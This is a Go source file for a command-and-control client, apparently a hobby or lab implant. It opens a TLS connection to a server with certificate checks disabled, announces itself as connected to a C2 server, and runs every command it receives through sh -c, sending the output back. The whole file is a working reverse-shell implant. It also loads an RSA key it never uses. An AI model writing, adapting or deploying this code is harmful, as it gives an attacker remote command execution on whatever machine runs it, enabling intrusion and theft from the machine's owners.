package main

import (
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
)

var publicKey *rsa.PublicKey

func main() {
	loadPublicKey()
	serverAddr := "127.0.0.1:5000"

	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", serverAddr, config)
	if err != nil {
		fmt.Println("[-] Failed to connect")
		return
	}
	defer conn.Close()

	fmt.Println("[+] Connected to C2 Server")
	for {
		command, err := receiveCommand(conn)
		if err != nil {
			fmt.Println("[-] Connection closed")
			break
		}
		if command == "" {
			continue
		}
		output := executeCommand(command)
		conn.Write([]byte(output + "\n"))
	}
}

func loadPublicKey() {
	keyData, err := ioutil.ReadFile("certs/rsa_public.pem")
	if err != nil {
		panic(err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		panic("[-] Failed to decode RSA public key")
	}

	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	publicKey = pub
}

func receiveCommand(conn net.Conn) (string, error) {
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	return string(buf[:n]), nil
}

func executeCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "[-] Command execution failed"
	}
	return string(out)
}
